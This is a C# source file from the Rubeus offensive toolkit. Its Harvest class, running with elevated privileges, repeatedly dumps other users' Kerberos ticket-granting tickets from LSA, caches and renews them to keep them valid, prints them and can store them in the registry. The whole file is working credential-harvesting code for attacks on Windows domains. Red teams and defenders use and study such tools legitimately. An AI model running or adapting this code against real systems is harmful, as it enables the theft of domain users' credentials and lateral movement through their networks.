using System;
using System.Collections.Generic;
using System.Threading;
using Rubeus.lib.Interop;

namespace Rubeus
{
    public class Harvest
    {
        private readonly List<KRB_CRED> harvesterTicketCache = new List<KRB_CRED>();
        private readonly int monitorIntervalSeconds;
        private readonly int displayIntervalSeconds;
        private readonly string targetUser;
        private readonly bool renewTickets;
        private readonly string registryBasePath;
        private readonly bool nowrap;
        private readonly int runFor;
        private DateTime lastDisplay;
        private DateTime collectionStart;

        public Harvest(int monitorIntervalSeconds, int displayIntervalSeconds, bool renewTickets, string targetUser, string registryBasePath, bool nowrap, int runFor)
        {
            this.monitorIntervalSeconds = monitorIntervalSeconds;
            this.displayIntervalSeconds = displayIntervalSeconds;
            this.renewTickets = renewTickets;
            this.targetUser = targetUser;
            this.registryBasePath = registryBasePath;
            this.lastDisplay = DateTime.Now;
            this.collectionStart = DateTime.Now;
            this.nowrap = nowrap;
            this.runFor = runFor;
        }

        public void HarvestTicketGrantingTickets()
        {
            if (!Helpers.IsHighIntegrity())
            {
                Console.WriteLine("\r\n[X] You need to have an elevated context to dump other users' Kerberos tickets :( \r\n");
                return;
            }

            // get the current set of TGTs
            while (true)
            {
                // extract out the TGTs (service = krbtgt_ w/ full data, silent enumeration
                List<LSA.SESSION_CRED> sessionCreds = LSA.EnumerateTickets(true, new LUID(), "krbtgt", this.targetUser, null, true, true);
                List<KRB_CRED> currentTickets = new List<KRB_CRED>();
                foreach(var sessionCred in sessionCreds)
                {
                    foreach(var ticket in sessionCred.Tickets)
                    {
                        currentTickets.Add(ticket.KrbCred);
                    }
                }

                if (renewTickets) {
                    // "harvest" mode - so don't display new tickets as they come in
                    AddTicketsToTicketCache(currentTickets, false);

                    // check if we're at a new display interval
                    if(lastDisplay.AddSeconds(this.displayIntervalSeconds) < DateTime.Now.AddSeconds(1))
                    {
                        this.lastDisplay = DateTime.Now;
                        // refresh/renew everything in the cache and display the working set
                        RefreshTicketCache(true);
                        Console.WriteLine("[*] Sleeping until {0} ({1} seconds) for next display\r\n", DateTime.Now.AddSeconds(displayIntervalSeconds), displayIntervalSeconds);
                    }
                    else
                    {
                        // refresh/renew everything in the cache, but don't display the working set
                        RefreshTicketCache();
                    }
                }
                else
                {
                    // "monitor" mode - display new ticketson harvest
                    AddTicketsToTicketCache(currentTickets, true);
                }

                if (registryBasePath != null)
                {
                    LSA.SaveTicketsToRegistry(harvesterTicketCache, registryBasePath);
                }

                if (runFor > 0)
                {
                    // compares execution start time + time entered to run the harvest for against current time to determine if we should exit
                    if (collectionStart.AddSeconds(this.runFor) < DateTime.Now)
                    {
                        Console.WriteLine("[*] Completed running for {0} seconds, exiting\r\n", runFor);
                        System.Environment.Exit(0);
                    }
                }

                // If a runFor time is set and the monitoring interval is longer than the time remaining on the run, 
                // the sleep interval will be adjusted down to however much time left in the run there is. 
                if (runFor > 0 && collectionStart.AddSeconds(this.runFor) < DateTime.Now.AddSeconds(monitorIntervalSeconds))
                {
                    TimeSpan t = collectionStart.AddSeconds(this.runFor + 1) - DateTime.Now;
                    Thread.Sleep((int)t.TotalSeconds * 1000);
                }
                // else we'll do a normal monitor interval sleep
                else
                {
                    Thread.Sleep(monitorIntervalSeconds * 1000);
                }
            }
        }

        private void AddTicketsToTicketCache(List<KRB_CRED> tickets, bool displayNewTickets)
        {
            // adds a list of KRB_CREDs to the internal cache
            //  displayNewTickets - display new TGTs as they're added, e.g. "monitor" mode

            bool newTicketsAdded = false;

            if (tickets == null)
                throw new ArgumentNullException(nameof(tickets));

            foreach (var ticket in tickets)
            {
                var newTgtBytes = Convert.ToBase64String(ticket.RawBytes);

                var ticketInCache = false;

                foreach (var cachedTicket in harvesterTicketCache)
                {
                    // check the base64 of the raw ticket bytes to see if we've seen it before
                    if (Convert.ToBase64String(cachedTicket.RawBytes) == newTgtBytes)
                    {
                        ticketInCache = true;
                        break;
                    }
                }

                if (ticketInCache)
                    continue;

                var endTime = TimeZone.CurrentTimeZone.ToLocalTime(ticket.enc_part.ticket_info[0].endtime);

                if (endTime < DateTime.Now)
                {
                    // skip if the ticket is expired
                    continue;
                }

                harvesterTicketCache.Add(ticket);
                newTicketsAdded = true;

                if (displayNewTickets)
                {
                    Console.WriteLine($"\r\n[*] {DateTime.Now.ToUniversalTime()} UTC - Found new TGT:\r\n");
                    LSA.DisplayTicket(ticket, 2, true, true, false, this.nowrap);
                }
            }

            if(displayNewTickets && newTicketsAdded)
                Console.WriteLine("[*] Ticket cache size: {0}\r\n", harvesterTicketCache.Count);
        }

        private void RefreshTicketCache(bool display = false)
        {
            // goes through each ticket in the cache, removes any tickets that have expired
            //  and renews any tickets that are going to expire before the next check interval
            //  then displays the current "active" ticket cache if "display" is passed as true

            if (display)
                Console.WriteLine("\r\n[*] Refreshing TGT ticket cache ({0})\r\n", DateTime.Now);

            for (var i = harvesterTicketCache.Count - 1; i >= 0; i--)
            {
                var endTime = TimeZone.CurrentTimeZone.ToLocalTime(harvesterTicketCache[i].enc_part.ticket_info[0].endtime);
                var renewTill = TimeZone.CurrentTimeZone.ToLocalTime(harvesterTicketCache[i].enc_part.ticket_info[0].renew_till);
                var userName = harvesterTicketCache[i].enc_part.ticket_info[0].pname.name_string[0];
                var domainName = harvesterTicketCache[i].enc_part.ticket_info[0].prealm;

                // check if the ticket has now expired
                if (endTime < DateTime.Now)
                {
                    Console.WriteLine("[!] Removing TGT for {0}@{1}\r\n", userName, domainName);
                    // remove the ticket from the cache
                    Console.WriteLine("harvesterTicketCache count: {0}", harvesterTicketCache.Count);
                    harvesterTicketCache.RemoveAt(i);
                    Console.WriteLine("harvesterTicketCache count: {0}", harvesterTicketCache.Count);
                }

                else
                {
                    // check if the ticket is going to expire before the next interval checkin
                    //  but we'll still be in the renew window
                    if ( (endTime < DateTime.Now.AddSeconds(monitorIntervalSeconds)) && (renewTill > DateTime.Now.AddSeconds(monitorIntervalSeconds)) )
                    {
                        // renewal limit after checkin interval, so renew the TGT
                        userName = harvesterTicketCache[i].enc_part.ticket_info[0].pname.name_string[0];
                        domainName = harvesterTicketCache[i].enc_part.ticket_info[0].prealm;

                        Console.WriteLine("[*] Renewing TGT for {0}@{1}\r\n", userName, domainName);
                        var bytes = Renew.TGT(harvesterTicketCache[i], "", false, "", false);
                        var renewedCred = new KRB_CRED(bytes);
                        harvesterTicketCache[i] = renewedCred;
                    }

                    if (display)
                        LSA.DisplayTicket(harvesterTicketCache[i], 2, true, true, false, this.nowrap);
                }

            }

            if (display)
                Console.WriteLine("[*] Ticket cache size: {0}", harvesterTicketCache.Count);
        }

    }
}
